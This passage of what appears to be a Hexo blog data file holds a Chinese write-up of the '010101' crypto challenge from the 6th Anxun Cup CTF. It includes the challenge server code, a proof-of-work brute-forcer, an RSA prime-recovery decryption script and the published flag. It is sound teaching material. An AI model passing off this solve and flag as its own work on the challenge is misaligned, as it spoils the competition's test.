title=\"赛事网址\"></a>赛事网址</h2><p><a href=\"https://dce.i-soon.net/#/examineDetails\">https://dce.i-soon.net/#/examineDetails</a></p>\n<h2 id=\"010101\"><a href=\"#010101\" class=\"headerlink\" title=\"010101\"></a>010101</h2><h3 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> socketserver</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> isPrime, long_to_bytes, getStrongPrime, bytes_to_long</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">b&quot;D0g3&#123;******************************************&#125;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MyServer</span>(socketserver.BaseRequestHandler):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">proof</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        random.seed(os.urandom(<span class=\"number\">8</span>))</span><br><span class=\"line\">        random_str = <span class=\"string\">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters + string.digits) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>)])</span><br><span class=\"line\">        str_sha256 = hashlib.sha256(random_str.encode()).hexdigest()</span><br><span class=\"line\">        self.request.sendall((<span class=\"string\">&#x27;SHA256(XXXX + %s):%s\\n&#x27;</span> % (random_str[<span class=\"number\">4</span>:], str_sha256)).encode())</span><br><span class=\"line\">        self.request.sendall(<span class=\"string\">&#x27;Give Me XXXX:\\n&#x27;</span>.encode())</span><br><span class=\"line\">        XXXX = self.request.recv(<span class=\"number\">2048</span>).strip()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> hashlib.sha256((XXXX + random_str[<span class=\"number\">4</span>:].encode())).hexdigest() != str_sha256:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">getPQN</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            p = getStrongPrime(<span class=\"number\">2048</span>)</span><br><span class=\"line\">            q = getStrongPrime(<span class=\"number\">2048</span>)</span><br><span class=\"line\">            n = p * q</span><br><span class=\"line\">            <span class=\"keyword\">if</span> p.bit_length() == <span class=\"number\">2048</span> <span class=\"keyword\">and</span> q.bit_length() == <span class=\"number\">2048</span> <span class=\"keyword\">and</span> n.bit_length() == <span class=\"number\">4096</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> p, q, n</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        p, q, n = self.getPQN()</span><br><span class=\"line\">        m = bytes_to_long(flag)</span><br><span class=\"line\">        e = <span class=\"number\">0x10001</span></span><br><span class=\"line\">        c = <span class=\"built_in\">pow</span>(m, e, n)</span><br><span class=\"line\">        p = <span class=\"built_in\">bin</span>(p)[<span class=\"number\">2</span>:]</span><br><span class=\"line\">        p1 = <span class=\"built_in\">list</span>(p[:<span class=\"number\">1024</span>])</span><br><span class=\"line\">        p2 = <span class=\"built_in\">list</span>(p[<span class=\"number\">1024</span>:])</span><br><span class=\"line\">        p1[random.choice([i <span class=\"keyword\">for</span> i, c <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(p1) <span class=\"keyword\">if</span> c == <span class=\"string\">&#x27;1&#x27;</span>])] = <span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">        p2[random.choice([i <span class=\"keyword\">for</span> i, c <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(p1) <span class=\"keyword\">if</span> c == <span class=\"string\">&#x27;0&#x27;</span>])] = <span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> n, <span class=\"string\">&#x27;&#x27;</span>.join(p1) + <span class=\"string\">&#x27;&#x27;</span>.join(p2), c</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">handle</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> self.proof():</span><br><span class=\"line\">            self.request.sendall(<span class=\"string\">b&#x27;Error Hash!&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        n, p, c = self.encrypt()</span><br><span class=\"line\">        self.request.sendall(<span class=\"string\">&#x27;Press 1 to get ciphertext\\n&#x27;</span>.encode())</span><br><span class=\"line\">        number = self.request.recv(<span class=\"number\">512</span>).strip().decode()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> number == <span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">            self.request.sendall((<span class=\"built_in\">str</span>(n) + <span class=\"string\">&#x27;\\n&#x27;</span>).encode())</span><br><span class=\"line\">            self.request.sendall((<span class=\"built_in\">str</span>(p) + <span class=\"string\">&#x27;\\n&#x27;</span>).encode())</span><br><span class=\"line\">            self.request.sendall((<span class=\"built_in\">str</span>(c) + <span class=\"string\">&#x27;\\n&#x27;</span>).encode())</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.request.sendall(<span class=\"string\">&#x27;Incorrect input!\\n&#x27;</span>.encode())</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    sever = socketserver.ThreadingTCPServer((<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"number\">10001</span>), MyServer)</span><br><span class=\"line\">    ThreadedTCPServer.allow_reuse_address = <span class=\"literal\">True</span></span><br><span class=\"line\">    ThreadedTCPServer.allow_reuse_port = <span class=\"literal\">True</span></span><br><span class=\"line\">    sever.serve_forever()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"考点\"><a href=\"#考点\" class=\"headerlink\" title=\"考点\"></a>考点</h3><ul>\n<li><code>crypto</code></li>\n<li><code>SHA256</code></li>\n<li><code>RSA</code></li>\n</ul>\n<h3 id=\"WriteUp\"><a href=\"#WriteUp\" class=\"headerlink\" title=\"WriteUp\"></a>WriteUp</h3><ul>\n<li>分析代码逻辑：<ul>\n<li><code>proof</code>：<ul>\n<li>随机生成一个字符串<code>random_str</code></li>\n<li>计算字符串的哈希值<code>str_sha256</code></li>\n<li>给出<code>random_str[4:]</code>和<code>str_sha256</code>，让用户计算<code>random_str[:4]</code></li>\n<li>如果用户给定的<code>random_str[:4]</code>和<code>random_str[4:]</code>的哈希值相同，则验证通过</li>\n</ul>\n</li>\n<li><code>getPQN</code>：<ul>\n<li>随机生成两个大素数<code>p</code>和<code>q</code>，满足以下要求：<code>p.bit_length() == 2048 and q.bit_length() == 2048 and (p*q).bit_length() == 4096</code></li>\n<li><code>return p, q, n</code></li>\n</ul>\n</li>\n<li><code>encrypt</code>：<ul>\n<li>通过<code>getPQN</code>生成<code>p</code>和<code>q</code>和<code>n</code></li>\n<li>计算密文<code>c = pow(m, e, n)</code></li>\n<li>对<code>p</code>进行变换：前1024位随机挑选一个1变成0，后1024位随机挑选一位变成1，得到<code>fake_p</code></li>\n<li><code>return n, fake_p, c</code></li>\n</ul>\n</li>\n<li><code>handle</code>：   <ul>\n<li>通过<code>proof</code>函数判断用户输入的<code>XXXX</code>和<code>random_str[4:]</code>的哈希值是否相同         </li>\n<li>相同的话，通过<code>encrypt</code>函数对<code>flag</code>进行加密，返回<code>n, fake_p, c</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>解题步骤：<ul>\n<li><code>nc</code>连入服务器，获取<code>random_str[4:]</code>和<code>str_sha256</code><br><img src=\"/2024/01/07/WriteUp-%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-010101/nc%E8%BF%9E%E6%8E%A5%E5%9B%9E%E6%98%BE.png\"></li>\n<li>通过<code>getXXXX.py</code>爆破<code>random_str[:4]</code>，并将结果发送给服务器，获得<code>n，fake_p，c</code><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"><span class=\"keyword\">from</span> string <span class=\"keyword\">import</span> digits, ascii_letters, punctuation</span><br><span class=\"line\">alpha_bet=digits+ascii_letters+punctuation</span><br><span class=\"line\">strlist = itertools.product(alpha_bet, repeat=<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sha256=<span class=\"string\">&quot;5ccd4cda1dc33d20a072cddf2cf921c865b274da912edb7ac3f157404c3fe4e3&quot;</span></span><br><span class=\"line\">tail=<span class=\"string\">&quot;uLBLoFfDko5h5uA9&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">xxxx=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> strlist:</span><br><span class=\"line\">    data=i[<span class=\"number\">0</span>]+i[<span class=\"number\">1</span>]+i[<span class=\"number\">2</span>]+i[<span class=\"number\">3</span>]</span><br><span class=\"line\">    data_sha=hashlib.sha256((data+<span class=\"built_in\">str</span>(tail)).encode()).hexdigest()</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(data_sha==<span class=\"built_in\">str</span>(sha256)):</span><br><span class=\"line\">        xxxx=data</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(xxxx)</span><br></pre></td></tr></table></figure></li>\n<li>基于<code>encrypt</code>函数，编写<a href=\"./files/decrypt.py\"><code>decrypt.py</code></a>脚本，破解<code>p</code>，解密得到<code>flag</code><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> socketserver</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">n=<span class=\"number\">909467367699122020071016988650306999295228108976638769699035391871165765547800730173871546690865275123375066230171521311068819816852640125745292539541259006023609504769135551654529045891894185101263480691408339167146959806826342796151867522273018753414683125578415962666829770904166690498846087399777025030862122796483743577214854248422262763202974262015130017066825754008160259189414818697567284326444565265735329976239935592453543076795651573576794776003238789860869381589213987112412732442793109900427324085928201408085720252507826509949584097216821241278182597257299885172782505117521436358744947983811939554943145617958259867137670519879871430621545154465019553001205911580515698810275961361004704605451591223643427530911392689056988136336912424730785373902092658701108834786609423741166892942322112744091173801215997979197781791157780385712374075574951133435122784372704793303399699730638707098947178219189508884581830248871075957102690166621382729933821529281361101591281902812061185346676660877303782149165897420682724683205662866974137418732285231256810541807361468193401184858075051706155601176563558866315093106261534227649361408522136583934234512184301782185760219449297423394506961283209453334215176208906015567865682661</span></span><br><span class=\"line\">fake_p=<span class=\"string\">&#x27;11100000100010111111010011100000110011001000001001111011001010011100001101000000001010000010101000011110000001000000010111000110101000101101011101111010001110110000000001101110100011101001100011101010110011111001001011101000110100011011101011110110001111100110101000010110110001001110001101111111100001101101110010011110100101110001101101101011011100111110101111000111000010011101001000011110000101111000010110000001100001111001011100011001110110110110000110000110111010111101110111100100111101111001100110010000000110011011111011111100000010010111111000010110010000110000111100011001111010101000111110011110001010101010010100001010100110111111101010010000000100101011001011100100111111001000111011111010101011111111010011101110111111110011101111001000011011000000000011100101101000001101110101100001110000110101011001000010110110000110110001101010110001100010110010110000000001110001101111011100011011110101010010011010100011010100010101100000010111100000101100010110000100001001101001001001111011011000101010001011010001100101110111111100111111001011100001100001011101011000000001101111011011001001100100111101100100111100100000000111110100011100011110001101100000100000101001101100010100000110111010001111011010110100101010101100000000001111001111010100011000010010010001010011100111100001101100111100010101111101011001100011111011000011101111110101110010100011000111010100000000111110111001111110100011100100111101001101011010110001100000101010001111000110100110101110001011100010011100111110111111010001110111000001000010111110100000110110110010111101101111010010110100011110110011011010010000000000101110101001001111100110111111001000000101101011111011110110111111001101001111011100110101101010101100000010100111101110110101101010100110011010011101101000010011101011001011110001011110011000101110000100000110100011101001100101110000001110100111010110110000101000011011010011100101101011010010010100110011011100001110001000000111101111000001010110111111010110101111000100111111111111101111001110101101111111101111011011101111111000100000110111&#x27;</span></span><br><span class=\"line\">c=<span class=\"number\">694500789519839583373480124753870609796624184368847740052659890684952282469412685843793893336588959688292535565388961237054382061607809034620598317779687541764120119851622500197513641485700221545824097256986828990721130988465432457926804939623885349284941907683524562179105951076405178191916974212394857571647273209891325684133975190612454243345915122493599006273649156588911638621279271660577286076492174133379924878816759449537816258877983535822071467357826352013991371273144147958254806851665648862909470014188217381547444474766611515043375595448634817257201321537710925281810846187991415244304258902323932755496219900194257710795367213151869032406828586461628113793387618900293473170817978068346842472541499877290335671510770413540109295368927586613167172537907784632075379648806105818669008103026164730513033786875076959900405998112656279798642754984874654321483935047414576483030634418889375971016788408747123075626184286939742532706576269950026208168650867226593584227608482405783125152467929531339747039920420671850985997912834217484356948372454631601487864570640693252550030654681522447089126289751692094672022733644147229926742656125552935762042624836326359406490008032106080800094693108856102201450516929541344003829402493</span></span><br><span class=\"line\">e = <span class=\"number\">0x10001</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">fake_p1=<span class=\"built_in\">list</span>(fake_p[:<span class=\"number\">1024</span>])</span><br><span class=\"line\">fake_p2=<span class=\"built_in\">list</span>(fake_p[<span class=\"number\">1024</span>:])</span><br><span class=\"line\">p=<span class=\"number\">0</span></span><br><span class=\"line\">q=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, x <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(fake_p1):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x == <span class=\"string\">&#x27;0&#x27;</span>:</span><br><span class=\"line\">        p1=fake_p1[:i]+[<span class=\"string\">&#x27;1&#x27;</span>]+fake_p1[i+<span class=\"number\">1</span>:]</span><br><span class=\"line\">        p2=fake_p2</span><br><span class=\"line\">        p=<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(p1)+<span class=\"string\">&#x27;&#x27;</span>.join(p2),<span class=\"number\">2</span>)   </span><br><span class=\"line\">        <span class=\"keyword\">if</span> n%p==<span class=\"number\">0</span>:</span><br><span class=\"line\">            q=n//p</span><br><span class=\"line\">            <span class=\"keyword\">if</span> p.bit_length() == <span class=\"number\">2048</span> <span class=\"keyword\">and</span> q.bit_length() == <span class=\"number\">2048</span> <span class=\"keyword\">and</span> n.bit_length() == <span class=\"number\">4096</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Get p q!\\n&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;bad format1!&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:         </span><br><span class=\"line\">            <span class=\"keyword\">for</span> j,y <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(fake_p2):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> y== <span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">                    p2=fake_p2[:j]+[<span class=\"string\">&#x27;0&#x27;</span>]+fake_p2[j+<span class=\"number\">1</span>:]</span><br><span class=\"line\">                    p=<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(p1)+<span class=\"string\">&#x27;&#x27;</span>.join(p2),<span class=\"number\">2</span>)   </span><br><span class=\"line\">                    <span class=\"keyword\">if</span> n%p==<span class=\"number\">0</span>:</span><br><span class=\"line\">                        q=n//p</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> p.bit_length() == <span class=\"number\">2048</span> <span class=\"keyword\">and</span> q.bit_length() == <span class=\"number\">2048</span> <span class=\"keyword\">and</span> n.bit_length() == <span class=\"number\">4096</span>:</span><br><span class=\"line\">                            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Get p q!\\n&quot;</span>)</span><br><span class=\"line\">                            <span class=\"keyword\">break</span></span><br><span class=\"line\">                        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;bad format2!&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(q)</span><br><span class=\"line\">phi_n = (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;phi_n:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(phi_n)</span><br><span class=\"line\">d = <span class=\"built_in\">pow</span>(e, -<span class=\"number\">1</span>, phi_n)</span><br><span class=\"line\">m = <span class=\"built_in\">pow</span>(c, d, n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"FLAG\"><a href=\"#FLAG\" class=\"headerlink\" title=\"FLAG\"></a>FLAG</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D0g3&#123;sYuWzkFk12A1gcWxG9pymFcjJL7CqN4Cq8PAIACObJ&#125;</span><br></pre></td></tr></table></figure>\n"}],"PostAsset":[{"_id":"source/_posts/Miniconda-Vscode-Python-环境管理/condapath.png","post":"clrkqvviq0003foi8gi6mhmk5","slug":"condapath.png","modified":1,"renderable":1},{"_id":"source/_posts/WriteUp-第六届安洵杯网络安全挑战赛-010101/nc连接回显.png","post":"clrkqvvix000dfoi85wr0g4t7","slug":"nc连接回显.png","modified":1,"renderable":1}],"PostCategory":[{"post_id":"clrkqvvim0001foi80p2c3011","category_id":"clrkqvvir0004foi8acywgh2e","_id":"clrkqvviy000efoi818qlf7lb"},{"post_id":"clrkqvvit0007foi83fv6cryw","category_id":"clrkqvvir0004foi8acywgh2e","_id":"clrkqvviz000hfoi8afn1efi1"},{"post_id":"clrkqvvix000dfoi85wr0g4t7","category_id":"clrkqvviy000gfoi854axg9e5","_id":"clrkqvviz000kfoi8b1lrc3e4"}],"PostTag":[{"post_id":"clrkqvvim0001foi80p2c3011","tag_id":"clrkqvvis0005foi83tokco6w","_id":"clrkqvvix000cfoi8dgpqht4i"},{"post_id":"clrkqvviq0003foi8gi6mhmk5","tag_id":"clrkqvviv000bfoi87j8u98kg","_id":"clrkqvviz000lfoi8f2mj1njs"},{"post_id":"clrkqvviq0003foi8gi6mhmk5","tag_id":"clrkqvviy000ffoi8hpz4d0hf","_id":"clrkqvviz000mfoi864yegn36"},{"post_id":"clrkqvviq0003foi8gi6mhmk5","tag_id":"clrkqvviz000ifoi8hsvuhq8h","_id":"clrkqvvj0000ofoi8affw34c6"},{"post_id":"clrkqvvit0007foi83fv6cryw","tag_id":"clrkqvviz000jfoi849xle013","_id":"clrkqvvj0000pfoi84o0z0kkb"},{"post_id":"clrkqvvix000dfoi85wr0g4t7","tag_id":"clrkqvviz000nfoi8drzo4ykj","_id":"clrkqvvj0000qfoi8bx64f9ap"}],"Tag":[{"name":"CVE-2017-1297","_id":"clrkqvvis0005foi83tokco6w"},{"name":"Miniconda","_id":"clrkqvviv000bfoi87j8u98kg"},{"name":"Vscode","_id":"clrkqvviy000ffoi8hpz4d0hf"},{"name":"Python环境管理","_id":"clrkqvviz000ifoi8hsvuhq8h"},{"name":"CVE-2017-3599","_id":"clrkqvviz000jfoi849xle013"},{"name":"Crypto","_id":"clrkqvviz000nfoi8drzo4ykj"}]}}